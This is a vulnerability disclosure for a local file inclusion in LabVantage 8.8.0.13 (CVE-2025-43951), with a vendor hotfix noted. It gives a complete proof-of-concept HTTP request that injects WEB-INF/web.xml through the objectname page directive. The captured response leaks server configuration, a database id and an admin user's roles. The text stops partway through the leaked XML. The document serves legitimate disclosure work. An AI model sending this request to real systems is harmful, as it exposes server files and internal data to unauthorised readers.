# CVE-2025-43951
LabVantage 8.8.0.13, was found vulnerable to local file inclusion. Authenticated users can retrieve arbitrary files from the environment over the objectname request parameter.  

Notes: Vendor was notified and resolved the issue within several hours releasing hotfix release under "LV 8.8.0.13 HF6".

# Affected Product & Version
LabVantage 8.8.0.13

# PoC

The request:

````
POST /labvantage/rc?command=file&file=WEB-OPAL/pagetypes/list/maintenance_list.jsp&sdcid=Department HTTP/1.1
Host: domain.labvantage.com
Cookie: JSESSIONID=...
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://domain/labvantage/rc?command=page&sdcid=WorkItem&command=page&page=WorkItemMaint&_iframename=maint&__crc=crc_1738572564413
Content-Type: application/x-www-form-urlencoded
Content-Length: 3388
Origin: https://domain
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: iframe
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: keep-alive

fieldid=pr0_workareadepartmentid%3Bpr0_testingdepartmentid&mapcolumnid=departmentid%3Bparentdepartmentid&multiselect=N&dsname=pr&index=0&columnid=workareadepartmentid&__pagedirectives=%7b%22layout%22%3a%7b%22hidetitle%22%3a%22Y%22%2c%22applicationtitle%22%3a%22LabVantage%22%2c%22objectname%22%3a%22WEB-INF%5c%2fweb.xml%22%7d%2c%22restrictivewhere%22%3a%22%7b@%7d002800200070006100720065006e0074006400650070006100720074006d0065006e0074006900640020003d00200043004f0041004c00450053004300450028004e0055004c004c0049004600280027[*@@*]0027002c00200027002700290020002c00200070006100720065006e0074006400650070006100720074006d0065006e007400690064002900200041004e004400200077006f0072006b00610073007300690067006e006d0065006e00740066006c00610067003d00270059002700200041004e00440020002800740065007300740069006e00670066006c00610067003d0027004e00270020004f0052002000740065007300740069006e00670066006c006100670020004900530020004e0055004c004c0029002000290020004f005200200028006400650070006100720074006d0065006e0074006900640020003d00200043004f0041004c00450053004300450028004e0055004c004c0049004600280027[*@@*]0027002c00200027002700290020002c0020006400650070006100720074006d0065006e007400690064002900200041004e004400200077006f0072006b00610073007300690067006e006d0065006e00740066006c00610067003d00270059002700200041004e0044002000740065007300740069006e00670066006c00610067003d0027005900270029%22%2c%22buttons%22%3a%7b%220%22%3a%7b%22commonprops%22%3a%7b%22image%22%3a%22WEB-CORE%2fimages%2fgif%2fSelectAndReturn.gif%22%2c%22tip%22%3a%22Select%20and%20Close%22%2c%22text%22%3a%22Select%20%26%20Return%22%7d%2c%22standardbuttonprops%22%3a%7b%22action%22%3a%22Accept%22%7d%2c%22id%22%3a%22Accept%22%7d%2c%221%22%3a%7b%22commonprops%22%3a%7b%22image%22%3a%22WEB-CORE%2fimages%2fgif%2fCancel.gif%22%2c%22tip%22%3a%22Cancel%20and%20Close%22%2c%22text%22%3a%22Cancel%22%7d%2c%22standardbuttonprops%22%3a%7b%22action%22%3a%22Cancel%22%7d%2c%22id%22%3a%22Cancel%22%7d%7d%2c%22pageDirId%22%3a%22PGD_Department_81%22%2c%22columns%22%3a%7b%220%22%3a%7b%22mode%22%3a%22Display%20Text%22%2c%22lumode%22%3a%22Display%20and%20Return%22%2c%22returnvalue%22%3a%22Y%22%2c%22columnid%22%3a%22departmentid%22%2c%22mapfieldid%22%3a%22workareadepartmentid%22%2c%22link%22%3a%7b%22tip%22%3a%22Select%20and%20return%22%2c%22href%22%3a%22javascript%3aparent.accept('[keycolid1]')%3b%22%7d%2c%22id%22%3a%22departmentid%22%2c%22title%22%3a%22Work%20Area%22%2c%22searchable%22%3a%22Y%22%7d%2c%221%22%3a%7b%22mode%22%3a%22Display%20Text%22%2c%22lumode%22%3a%22Display%20Only%22%2c%22returnvalue%22%3a%22Y%22%2c%22columnid%22%3a%22departmentdesc%22%2c%22id%22%3a%22departmentdesc%22%2c%22title%22%3a%22Name%22%2c%22searchable%22%3a%22Y%22%7d%2c%222%22%3a%7b%22mode%22%3a%22Display%20Text%22%2c%22lumode%22%3a%22Display%20and%20Return%22%2c%22columnid%22%3a%22(select%20case%20when%20wa.parentdepartmentid%20is%20null%20then%20wa.departmentid%20else%20wa.parentdepartmentid%20end%20from%20department%20wa%20where%20wa.departmentid%3ddepartment.departmentid%20)%20parentdepartmentid%22%2c%22mapfieldid%22%3a%22testingdepartmentid%22%2c%22id%22%3a%22column2%22%2c%22title%22%3a%22Testing%20Lab%22%7d%7d%2c%22rowsperpage%22%3a%2250%22%2c%22selectortype%22%3a%22radiobutton%22%2c%22rowclickselection%22%3a%22Y%22%2c%22title%22%3a%22Departments%20Lookup%22%2c%22sdcid%22%3a%22Department%22%7d&_sdialog=Y&csrftoken=4b98c896288f86d051cd5812d90bbafe
````

Will result in a local file inclusion where the web.xml file will be included in the response of the server:

````
HTTP/1.1 200 OK
Date: Mon, 03 Feb 2025 12:43:06 GMT
Content-Type: text/html;charset=UTF-8
Connection: keep-alive
Set-Cookie: AWSALB=lkAQ1ezaBOla4/05jl1xEa9fk+mQZz7cTJqG92SQHSl1KrJ2HCb4elaq+PkNnLogaK9FHcHEF/CVk/M19ZKEhx0pffrr3yI7t76AZbNdah79ofu5yZWEfQyz3bfF; Expires=Mon, 10 Feb 2025 12:43:05 GMT; Path=/
Set-Cookie: AWSALBCORS=lkAQ1ezaBOla4/05jl1xEa9fk+mQZz7cTJqG92SQHSl1KrJ2HCb4elaq+PkNnLogaK9FHcHEF/CVk/M19ZKEhx0pffrr3yI7t76AZbNdah79ofu5yZWEfQyz3bfF; Expires=Mon, 10 Feb 2025 12:43:05 GMT; Path=/; SameSite=None; Secure
Server: Apache
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-UA-Compatible: IE=edge
X-FRAME-OPTIONS: SAMEORIGIN
Referrer-Policy: strict-origin-when-cross-origin
Content-Security-Policy: default-src 'self' 'unsafe-inline' 'unsafe-eval'  https://*.virtualearth.net;img-src * data: blob:;frame-src 'self' https://*.duosecurity.com/ blob:;style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;font-src 'self' data: https://fonts.gstatic.com;connect-src 'self' https://*.tts.speech.microsoft.com/ data: wss:;base-uri 'self';frame-ancestors 'self';object-src 'self' blob:;script-src-elem 'self' https://*.virtualearth.net blob: 'unsafe-inline';worker-src 'self' blob:
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Content-Type-Options: nosniff
Set-Cookie: connectionid=...; HttpOnly; Secure; Path=/labvantage; SameSite=Strict
Content-Length: 31465



<script language="JavaScript" src="WEB-CORE/scripts/sapphirersaencrypt.js"></script><script language="JavaScript">var rsa = new RSAKey();rsa.setPublic('83f793143975ca84f6ce19fd4a31eb56b072793eeef2793eae983a04cfe0aca76b8df726c39b7377601227dcf45f31fb50848110613299b8764729a65de4b4e9f37e95139d72a3f1bc83817e8c3295d27dc922098b4336107c3f9eba874773bfb0154d5c02734b8d342110c13cb0c892a81721f108e0bd4161593b325155ba19','10001');rsa.setPrefix('{|}');rsa.setChunkSeparator('[!@]');</script><script type="text/javascript" src="WEB-CORE/scripts/json.js"></script><script type="text/javascript" src="WEB-CORE/scripts/sapphirecore.js"></script><script type="text/javascript" src="WEB-CORE/scripts/sapphireui.js"></script><script type="text/javascript" src="WEB-CORE/scripts/sapphirecc.js"></script><script type="text/javascript" src="WEB-CORE/scripts/sapphirelist.js"></script><script type="text/javascript" src="WEB-CORE/scripts/sapphiremaint.js"></script><script type="text/javascript" src="WEB-CORE/scripts/sapphiredataentry.js"></script><script type="text/javascript" src="WEB-CORE/scripts/sapphirelookup.js"></script><script type="text/javascript" src="WEB-CORE/scripts/sapphirerequest.js"></script><script type="text/javascript" src="WEB-CORE/scripts/sapphireelements.js"></script><script type="text/javascript">if(typeof(sapphire)=='undefined')var sapphire=new Sapphire();if(typeof(sapphire.ui)=='undefined')sapphire.ui=new SapphireUI();if(typeof(sapphire.cc)=='undefined')sapphire.cc=new SapphireCC();if(typeof(sapphire.page.list)=='undefined')sapphire.page.list=new SapphireList();if(typeof(sapphire.page.maint)=='undefined')sapphire.page.maint=new SapphireMaint();if(typeof(sapphire.page.dataentry)=='undefined')sapphire.page.dataentry=new SapphireDataEntry();if(typeof(sapphire.lookup)=='undefined')sapphire.lookup=new SapphireLookup();if(typeof(sapphire.page.request)=='undefined')sapphire.page.request=new SapphireRequest();if(typeof(sapphire.page.elements)=='undefined')sapphire.page.elements=new SapphireElements();</script><script type="text/javascript" language="javascript" src="WEB-CORE/gwt/pageentry/pageentry.nocache.js?lv8807"></script><link rel="stylesheet" href="WEB-CORE/stylesheets/labvantageapi.css" type="text/css"><link rel="shortcut icon" href="WEB-CORE/images/lvs.ico"><script type="text/javascript">if(typeof(sapphire)!='undefined'){sapphire.browser.id='FF';sapphire.browser.name='FireFox';sapphire.browser.osId='Linux';sapphire.browser.compat='FF';sapphire.browser.compatMode=false;sapphire.browser.compatVersion=102.0;sapphire.browser.version=102.0;sapphire.browser.mozillaVersion=5.0;sapphire.browser.webkitVersion=0.0;sapphire.browser.html=4.01;sapphire.browser.css=2.1;sapphire.browser.mozilla=true;sapphire.browser.webkit=false;sapphire.browser.chromium=false;sapphire.browser.firefox=true;sapphire.browser.setupDevice(false,false,false,'desktop');sapphire.browser.supported=false;sapphire.browser.gc=false;sapphire.connection.applicationRoot='';
sapphire.connection.databaseId='lvdbprod_8zkepk';sapphire.connection.sysUserId='Nirmala\x20Sriramulu';sapphire.connection.sysUserDesc='Install\x20created\x20admin\x20user';sapphire.connection.sysUserRoleList='Analyst\x3BApp_Admin\x3BApp_Manager\x3BApp_User\x3BArray\x20MasterData\x3BArray\x20Review\x3BArray\x20User\x3BAttachmentAdmin\x3BCAPA\x20MGR\x3BCAPA\x20QA\x3BCAPA\x20SME\x3BCAPA\x20User\x3BCertificationOverid\x3BCMT\x20Admin\x3BContact\x20Manager\x3BData\x20Manager\x3BDomain\x20Admin\x3BELNAdmin\x3BFormulationQA\x3BFormulationScientist\x3BInstrument\x20Manager\x3BInstrument\x20User\x3BIssueSubmitter\x3BLab\x20Data\x20Entry\x3BLab\x20User\x3BLabManager\x3BManagerApproval\x3BNotesAdministrator\x3BPackage\x20Receiver\x3BPreparation\x3BQA\x3BReagentManager\x3BReceipt\x3BReference\x3BRepository\x20User\x3BRequestAccepter\x3BRequestReleaser\x3BRequestSubmitter\x3BRequestUser\x3BSample\x20Submitter\x3BSampleLogin\x3BSampleReview\x3BSDMSAdmin\x3BSecurityAdmin\x3BSecurityEdit\x3BSMS\x20Admin\x3BStabilityTimepointReview\x3BStaging\x20Lab\x20User\x3BSupervisorApproval\x3BView\x20Hidden\x3BViewMaskedData\x3BVirtual\x3BWAP\x20Plan\x20Work\x3BWebPage\x2DAdmin\x3BWebPage\x2DApproval\x3BWebPage\x2DLabAdmin';sapphire.connection.sysUserModuleList='AdhocQuery\x3BAQC\x3BBatchManagement\x3BCAPA\x3BConfigReport\x3BDashboard\x3BELN\x3BFormulations\x3BLES\x3BRSM\x3BSampleMonitoring\x3BScheduler\x3BSDMS\x3BSEC\x3BSecurity\x3BStability\x3BSystemConfig\x3BWAP\x3BWPDPro\x3BWPDStd';sapphire.connection.sysUserDefaultDepartment='null';sapphire.connection.sysUserDepartmentList='';sapphire.connection.jobTypeId='';sapphire.connection.jobTypeList='';sapphire.connection.rtl=false;sapphire.connection.home='';sapphire.connection.rtl=false;sapphire.connection.timezone='CET';sapphire.connection.language='null';sapphire.connection.decimalSeparator='.';sapphire.connection.groupingSeparator=',';sapphire.connection.groupingInterval=4;sapphire.jsdebug=false;sapphire.connection.pingRsetFrqcy=60;sapphire.connection.pingConnectionFrqcy=60;sapphire.connection.connectionTimeout=3600;sapphire.connection.timeToTimeout=3600;if ( typeof(sapphire.ui) != 'undefined' ){sapphire.ui.animation.menuEnabled=true;sapphire.ui.animation.resizeInOutEnabled=true;sapphire.ui.animation.fadeInOutEnabled=true;}}</script><script type="text/javascript">sapphire.notification._debug=false;sapphire.connection.isDevMode=false;sapphire.connection.isCompDevMode=false;sapphire.connection.componentCode='';sapphire.connection.allowPageDirectives=true;if(typeof(sapphire.page)!='undefined'){sapphire.page.html5=true;sapphire.page.name='';sapphire.page.edition='';sapphire.page.stateid='';if(typeof(sapphire.page.request)!='undefined'){sapphire.page.request.data=sapphire.util.propertyList.create({"modernlayout":"Y","html5":"Y","__registeredpage":"false","sysuserinitals":"","dbms":"MSS","sdcid":"Department","externalappid":"","file":"WEB-OPAL/pagetypes/list/maintenance_list.jsp","__propertylistsequence":-1,"csrftoken":"4b98c896288f86d051cd5812d90bbafe","guimode":"desktop","columnid":"workareadepartmentid","modulelist":"AdhocQuery;AQC;BatchManagement;CAPA;ConfigReport;Dashboard;ELN;Formulations;LES;RSM;SampleMonitoring;Scheduler;SDMS;SEC;Security;Stability;SystemConfig;WAP;WPDPro;WPDStd","index":"0","_sdialog":"Y","propertytreelist":"advancedsearch;pagedirectives;hasModule;userconfig;list;layout;pagedata;advancedtoolbar","deviceid":"WebServer","command":"file","tool":"RequestController","multiselect":"N","sysuserid":"Nirmala Sriramulu","rolelist":"Analyst;App_Admin;App_Manager;App_User;Array MasterData;Array Review;Array User;AttachmentAdmin;CAPA MGR;CAPA QA;CAPA SME;CAPA User;CertificationOverid;CMT Admin;Contact Manager;Data Manager;Domain Admin;ELNAdmin;FormulationQA;FormulationScientist;Instrument Manager;Instrument User;IssueSubmitter;Lab Data Entry;Lab User;LabManager;ManagerApproval;NotesAdministrator;Package Receiver;Preparation;QA;ReagentManager;Receipt;Reference;Repository User;RequestAccepter;RequestReleaser;RequestSubmitter;RequestUser;Sample Submitter;SampleLogin;SampleReview;SDMSAdmin;SecurityAdmin;SecurityEdit;SMS Admin;StabilityTimepointReview;Staging Lab User;SupervisorApproval;View Hidden;ViewMaskedData;Virtual;WAP Plan Work;WebPage-Admin;WebPage-Approval;WebPage-LabAdmin","__propertylistid":"root_0","mapcolumnid":"departmentid;parentdepartmentid","dsname":"pr","pagedata":{"__pagedirectives":"{\"layout\":{\"hidetitle\":\"Y\",\"applicationtitle\":\"LabVantage\",\"objectname\":\"WEB-INF\\/web.xml\"},\"restrictivewhere\":\"{@}002800200070006100720065006e0074006400650070006100720074006d0065006e0074006900640020003d00200043004f0041004c00450053004300450028004e0055004c004c0049004600280027[*@@*]0027002c00200027002700290020002c00200070006100720065006e0074006400650070006100720074006d0065006e007400690064002900200041004e004400200077006f0072006b00610073007300690067006e006d0065006e00740066006c00610067003d00270059002700200041004e00440020002800740065007300740069006e00670066006c00610067003d0027004e00270020004f0052002000740065007300740069006e00670066006c006100670020004900530020004e0055004c004c0029002000290020004f005200200028006400650070006100720074006d0065006e0074006900640020003d00200043004f0041004c00450053004300450028004e0055004c004c0049004600280027[*@@*]0027002c00200027002700290020002c0020006400650070006100720074006d0065006e007400690064002900200041004e004400200077006f0072006b00610073007300690067006e006d0065006e00740066006c00610067003d00270059002700200041004e0044002000740065007300740069006e00670066006c00610067003d0027005900270029\",\"buttons\":{\"0\":{\"commonprops\":{\"image\":\"WEB-CORE/images/gif/SelectAndReturn.gif\",\"tip\":\"Select and Close\",\"text\":\"Select & Return\"},\"standardbuttonprops\":{\"action\":\"Accept\"},\"id\":\"Accept\"},\"1\":{\"commonprops\":{\"image\":\"WEB-CORE/images/gif/Cancel.gif\",\"tip\":\"Cancel and Close\",\"text\":\"Cancel\"},\"standardbuttonprops\":{\"action\":\"Cancel\"},\"id\":\"Cancel\"}},\"pageDirId\":\"PGD_Department_81\",\"columns\":{\"0\":{\"mode\":\"Display Text\",\"lumode\":\"Display and Return\",\"returnvalue\":\"Y\",\"columnid\":\"departmentid\",\"mapfieldid\":\"workareadepartmentid\",\"link\":{\"tip\":\"Select and return\",\"href\":\"javascript:parent.accept('[keycolid1]');\"},\"id\":\"departmentid\",\"title\":\"Work Area\",\"searchable\":\"Y\"},\"1\":{\"mode\":\"Display Text\",\"lumode\":\"Display Only\",\"returnvalue\":\"Y\",\"columnid\":\"departmentdesc\",\"id\":\"departmentdesc\",\"title\":\"Name\",\"searchable\":\"Y\"},\"2\":{\"mode\":\"Display Text\",\"lumode\":\"Display and Return\",\"columnid\":\"(select case when wa.parentdepartmentid is null then wa.departmentid else wa.parentdepartmentid end from department wa where wa.departmentid=department.departmentid ) parentdepartmentid\",\"mapfieldid\":\"testingdepartmentid\",\"id\":\"column2\",\"title\":\"Testing Lab\"}},\"rowsperpage\":\"50\",\"selectortype\":\"radiobutton\",\"rowclickselection\":\"Y\",\"title\":\"Departments Lookup\",\"sdcid\":\"Department\"}","columnid":"workareadepartmentid","index":"0","_sdialog":"Y","title":"Departments Lookup","command":"file","sdcid":"Department","multiselect":"N","file":"WEB-OPAL/pagetypes/list/maintenance_list.jsp","__propertylistid":"root_0","__propertylistsequence":-1,"mapcolumnid":"departmentid;parentdepartmentid","dsname":"pr","csrftoken":"4b98c896288f86d051cd5812d90bbafe","fieldid":"pr0_workareadepartmentid;pr0_testingdepartmentid"},"sysusername":"Install created admin user","__nextpage":"WEB-OPAL/pagetypes/list/maintenance_list.jsp","databaseid":"lvdbprod_8zkepk","sysuserdesc":"Install created admin user","fieldid":"pr0_workareadepartmentid;pr0_testingdepartmentid"});sapphire.page.request.data.pagedirectives={"layout":{"hidetitle":"Y","applicationtitle":"LabVantage","objectname":"WEB-INF\/web.xml"},"restrictivewhere":"{@}002800200070006100720065006e0074006400650070006100720074006d0065006e0074006900640020003d00200043004f0041004c00450053004300450028004e0055004c004c0049004600280027[*@@*]0027002c00200027002700290020002c00200070006100720065006e0074006400650070006100720074006d0065006e007400690064002900200041004e004400200077006f0072006b00610073007300690067006e006d0065006e00740066006c00610067003d00270059002700200041004e00440020002800740065007300740069006e00670066006c00610067003d0027004e00270020004f0052002000740065007300740069006e00670066006c006100670020004900530020004e0055004c004c0029002000290020004f005200200028006400650070006100720074006d0065006e0074006900640020003d00200043004f0041004c00450053004300450028004e0055004c004c0049004600280027[*@@*]0027002c00200027002700290020002c0020006400650070006100720074006d0065006e007400690064002900200041004e004400200077006f0072006b00610073007300690067006e006d0065006e00740066006c00610067003d00270059002700200041004e0044002000740065007300740069006e00670066006c00610067003d0027005900270029","buttons":{"0":{"commonprops":{"image":"WEB-CORE/images/gif/SelectAndReturn.gif","tip":"Select and Close","text":"Select & Return"},"standardbuttonprops":{"action":"Accept"},"id":"Accept"},"1":{"commonprops":{"image":"WEB-CORE/images/gif/Cancel.gif","tip":"Cancel and Close","text":"Cancel"},"standardbuttonprops":{"action":"Cancel"},"id":"Cancel"}},"pageDirId":"PGD_Department_81","columns":{"0":{"mode":"Display Text","lumode":"Display and Return","returnvalue":"Y","columnid":"departmentid","mapfieldid":"workareadepartmentid","link":{"tip":"Select and return","href":"javascript:parent.accept('[keycolid1]');"},"id":"departmentid","title":"Work Area","searchable":"Y"},"1":{"mode":"Display Text","lumode":"Display Only","returnvalue":"Y","columnid":"departmentdesc","id":"departmentdesc","title":"Name","searchable":"Y"},"2":{"mode":"Display Text","lumode":"Display and Return","columnid":"(select case when wa.parentdepartmentid is null then wa.departmentid else wa.parentdepartmentid end from department wa where wa.departmentid=department.departmentid ) parentdepartmentid","mapfieldid":"testingdepartmentid","id":"column2","title":"Testing Lab"}},"rowsperpage":"50","selectortype":"radiobutton","rowclickselection":"Y","title":"Departments Lookup","sdcid":"Department"};if(sapphire.page.request.data!=null&&typeof(sapphire.page.request.data.pagedata)!='undefined'){
sapphire.page.data=sapphire.page.request.data.pagedata;}else{sapphire.page.data=null;
}}}</script><script type="text/javascript" src="WEB-CORE/extscripts/jquery/jquery.min.js"></script><link href="WEB-CORE/extscripts/jquery/jquery.labvantage.min.css" rel="stylesheet" type="text/css"/>



<?xml version="1.0"?>

<web-app version="3.0" xmlns="http://java.sun.com/xml/ns/javaee" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://java.sun.com/xml/ns/javaee        http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd">
    <display-name>labvantage</display-name>
    <distributable />
    <context-param>
        <param-name>applicationid</param-name>
        <param-value>labvantage</param-value>
    </context-param>
    <context-param>
        <param-name>LABVANTAGE_HOME</param-name>
        <param-value />
    </context-param>
    <context-param>
        <param-name>RequestControllerName</param-name>
        <param-value>rc</param-value>
    </context-param>
    <context-param>
        <param-name>uploadrepository</param-name>
        <param-value>/temp/</param-value>
    </context-param>
    <context-param>
        <param-name>maxuploadsize</param-name>
        <param-value>10000000</param-value>
    </context-param>
    <context-param>
        <param-name>errorpage</param-name>
        <param-value>WEB-CORE/error/error.jsp</param-value>
    </context-param>
    <filter>
        <display-name>sapphire/HistoryRequest</display-name>
        <filter-name>HistoryRequest</filter-name>
        <filter-class>com.labvantage.sapphire.servlet.filter.HistoryRequest</filter-class>
    </filter>
    <filter>
        <display-name>sapphire/RejectRequest</display-name>
        <filter-name>RejectRequest</filter-name>
        <filter-class>com.labvantage.sapphire.servlet.filter.RejectRequest</filter-class>
        <async-supported>true</async-supported>
    </filter>
    <filter>
        <display-name>sapphire/Compression</display-name>
        <filter-name>Compression</filter-name>
        <filter-class>com.labvantage.sapphire.servlet.filter.Compression</filter-class>
        <async-supported>true</async-supported>
        <init-param>
            <param-name>compression</param-name>
            <param-value>gzip</param-value>
        </init-param>
        <init-param>
            <param-name>PatternList</param-name>
            <!-- Uncomment if you want attachments and reports ignored -->
            <!-- <param-value>(?i)*viewattachment*;(?i)*viewreport*;(?i)*command\=attachment*</param-value> -->
            <param-value></param-value>
        </init-param>
    </filter>
    <filter>
        <display-name>sapphire/AddHeaders</display-name>
        <filter-name>AddHeaders</filter-name>
        <filter-class>com.labvantage.sapphire.servlet.filter.AddHeaders</filter-class>
        <async-supported>true</async-supported>
        <init-param>
            <param-name>Expires</param-name>
            <param-value>dynamic:[date=now+2D]</param-value>
        </init-param>
        <init-param>
            <param-name>Cache-Control</param-name>
            <param-value>static:max-age=3600</param-value>
        </init-param>
    </filter>
    <filter>
        <display-name>sapphire/AddHeaders</display-name>
        <filter-name>AddHeaders_X_FRAME_OPTIONS</filter-name>
        <filter-class>com.labvantage.sapphire.servlet.filter.AddHeaders</filter-class>
        <async-supported>true</async-supported>
        <init-param>
            <param-name>X-FRAME-OPTIONS</param-name>
            <param-value>static:SAMEORIGIN</param-value>
        </init-param>
        <init-param>
            <param-name>X-Content-Type-Options</param-name>
            <param-value>static:nosniff</param-value>
        </init-param>
       <init-param>
            <param-name>Content-Security-Policy</param-name>
            <param-value>static:default-src 'self' 'unsafe-inline' 'unsafe-eval'  https://*.virtualearth.net;img-src * data: blob:;frame-src 'self' https://*.duosecurity.com/ blob:;style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;font-src 'self' data: https://fonts.gstatic.com;connect-src 'self' https://*.tts.speech.microsoft.com/ data: wss:;base-uri 'self';frame-ancestors 'self';object-src 'self' blob:;script-src-elem 'self' https://*.virtualearth.net blob: 'unsafe-inline';worker-src 'self' blob:</param-value>
        </init-param>
        <init-param>
            <param-name>Referrer-Policy</param-name>
            <param-value>static:strict-origin-when-cross-origin</param-value>
        </init-param>
    </filter>
    <filter-mapping>
        <filter-name>AddHeaders_X_FRAME_OPTIONS</filter-name>
        <url-pattern>/rc/*</url-pattern>
    </filter-mapping>
    <filter-mapping>
        <filter-name>AddHeaders_X_FRAME_OPTIONS</filter-name>
        <url-pattern>/logon.jsp</url-pattern>
    </filter-mapping>
    <filter-mapping>
        <filter-name>AddHeaders_X_FRAME_OPTIONS</filter-name>
        <url-pattern>/rest/*</url-pattern>
    </filter-mapping>
    <filter-mapping>
        <filter-name>AddHeaders_X_FRAME_OPTIONS</filter-name>
        <url-pattern>/sc/*</url-pattern>
    </filter-mapping>
    <filter-mapping>
        <filter-name>AddHeaders_X_FRAME_OPTIONS</filter-name>
        <url-pattern>/services/*</url-pattern>
    </filter-mapping>
    <filter-mapping>
        <filter-name>AddHeaders_X_FRAME_OPTIONS</filter-name>
        <url-pattern>/wsp/*</url-pattern>
    </filter-mapping>
    <filter-mapping>
        <filter-name>AddHeaders_X_FRAME_OPTIONS</filter-name>
        <url-pattern>/stellar/*</url-pattern>
    </filter-mapping>
    <filter-mapping>
        <filter-name>AddHeaders</filter-name>
        <url-pattern>*.js</url-pattern>
    </filter-mapping>
    <filter-mapping>
        <filter-name>AddHeaders</filter-name>
        <url-pattern>*.gif</url-pattern>
    </filter-mapping>
    <filter-mapping>
        <filter-name>AddHeaders</filter-name>
        <url-pattern>*.jpg</url-pattern>
    </filter-mapping>
    <filter-mapping>
        <filter-name>AddHeaders</filter-name>
        <url-pattern>*.png</url-pattern>
    </filter-mapping>
    <filter-mapping>
        <filter-name>AddHeaders</filter-name>
        <url-pattern>*.svg</url-pattern>
    </filter-mapping>
    <filter-mapping>
        <filter-name>AddHeaders</filter-name>
        <url-pattern>*.css</url-pattern>
    </filter-mapping>
    <filter-mapping>
        <filter-name>AddHeaders</filter-name>
        <url-pattern>*.txt</url-pattern>
    </filter-mapping>
    <filter-mapping>
        <filter-name>AddHeaders</filter-name>
        <url-pattern>*.mp3</url-pattern>
    </filter-mapping>
    <filter-mapping>
        <filter-name>AddHeaders</filter-name>
        <url-pattern>*.json</url-pattern>
    </filter-mapping>
    <filter-mapping>
        <filter-name>AddHeaders</filter-name>
        <url-pattern>/stellar/*</url-pattern>
    </filter-mapping>
    <filter-mapping>
        <filter-name>HistoryRequest</filter-name>
        <servlet-name>RequestController</servlet-name>
    </filter-mapping>
    <filter-mapping>
        <filter-name>RejectRequest</filter-name>
        <servlet-name>SapphireController</servlet-name>
    </filter-mapping>
    <filter-mapping>
        <filter-name>RejectRequest</filter-name>
        <servlet-name>RequestController</servlet-name>
    </filter-mapping>
    <filter-mapping>
        <filter-name>RejectRequest</filter-name>
        <url-pattern>*.jsp</url-pattern>
    </filter-mapping>
    <filter-mapping>
        <filter-name>RejectRequest</filter-name>
        <url-pattern>*.html</url-pattern>
    </filter-mapping>
    <filter-mapping>
        <filter-name>RejectRequest</filter-name>
        <url-pattern>*.js</url-pattern>
    </filter-mapping>
    <filter-mapping>
        <filter-name>Compression</filter-name>
        <servlet-name>SapphireController</servlet-name>
    </filter-mapping>
    <filter-mapping>
        <filter-name>Compression</filter-name>
        <servlet-name>RequestController</servlet-name>
    </filter-mapping>
    <filter-mapping>
        <filter-name>Compression</filter-name>
        <servlet-name>StellarController</servlet-name>
    </filter-mapping>
    <filter-mapping>
        <filter-name>Compression</filter-name>
        <url-pattern>*.jsp</url-pattern>
    </filter-mapping>
    <filter-mapping>
        <filter-name>Compression</filter-name>
        <url-pattern>*.html</url-pattern>
    </filter-mapping>
    <filter-mapping>
        <filter-name>Compression</filter-name>
        <url-pattern>*.js</url-pattern>
    </filter-mapping>
    <filter-mapping>
        <filter-name>Compression</filter-name>
        <url-pattern>*.css</url-pattern>
    </filter-mapping>
    <filter-mapping>
        <filter-name>Compression</filter-name>
        <url-pattern>*.jpg</url-pattern>
    </filter-mapping>
    <filter-mapping>
        <filter-name>Compression</filter-name>
        <url-pattern>*.png</url-pattern>
    </filter-mapping>
    <filter-mapping>
        <filter-name>Compression</filter-name>
        <url-pattern>*.svg</url-pattern>
    </filter-mapping>
    <filter-mapping>
        <filter-name>Compression</filter-name>
        <url-pattern>*.json</url-pattern>
    </filter-mapping>
    <filter-mapping>
        <filter-name>Compression</filter-name>
        <url-pattern>*.txt</url-pattern>
    </filter-mapping>
    <filter-mapping>
        <filter-name>Compression</filter-name>
        <url-pattern>*.mp3</url-pattern>
    </filter-mapping>
    <servlet>
        <display-name>SapphireController</display-name>
        <servlet-name>SapphireController</servlet-name>
        <servlet-class>com.labvantage.sapphire.servlet.SapphireController</servlet-class>
        <load-on-startup>1</load-on-startup>
    </servlet>
    <!-- Start portal -->
    <servlet>
        <display-name>PortalController</display-name>
        <servlet-name>PortalController</servlet-name>
        <servlet-class>com.labvantage.stellar.servlet.PortalController</servlet-class>
        <!-- Change to the defined portal sdi and current database for the portal-->
        <init-param>
            <param-name>portal</param-name>
            <param-value>[the portal id here]</param-value>
        </init-param>
        <init-param>
            <param-name>database</param-name>
            <param-value>[the database id here]</param-value>
        </init-param>
        <init-param>
            <!-- Change to Y to show client side debug logging -->
            <param-name>debug</param-name>
            <param-value>Y</param-value>
        </init-param>
        <init-param>
            <!-- Change to N to disable data and command encryption (e.g. row id) -->
            <param-name>encrypt</param-name>
            <param-value>Y</param-value>
        </init-param>
        <init-param>
            <!-- Change to N to disable data and cookie encryption (e.g. database and portal id) -->
            <param-name>encryptcookies</param-name>
            <param-value>Y</param-value>
        </init-param>
        <init-param>
            <!-- Change to Y to refresh any page property changes from the webpage designer automatically on save -->
            <param-name>autorefreshproperties</param-name>
            <param-value>N</param-value>
        </init-param>
        <load-on-startup>1</load-on-startup>
    </servlet>
    <servlet-mapping>
        <servlet-name>PortalController</servlet-name>
        <url-pattern>/portal/*</url-pattern>
    </servlet-mapping>
    <!-- Change any portal filter mapping to match the portal endpoint-->
    <filter-mapping>
        <filter-name>AddHeaders</filter-name>
        <url-pattern>/portal/*</url-pattern>
    </filter-mapping>
    <filter-mapping>
        <filter-name>AddHeaders_X_FRAME_OPTIONS</filter-name>
        <url-pattern>/portal/*</url-pattern>
    </filter-mapping>
    <filter-mapping>
        <filter-name>Compression</filter-name>
        <servlet-name>PortalController</servlet-name>
    </filter-mapping>
    <filter>
        <display-name>portal/PortalRequest</display-name>
        <filter-name>PortalRequest</filter-name>
        <filter-class>com.labvantage.sapphire.servlet.filter.PortalRequest</filter-class>
        <async-supported>true</async-supported>
        <init-param>
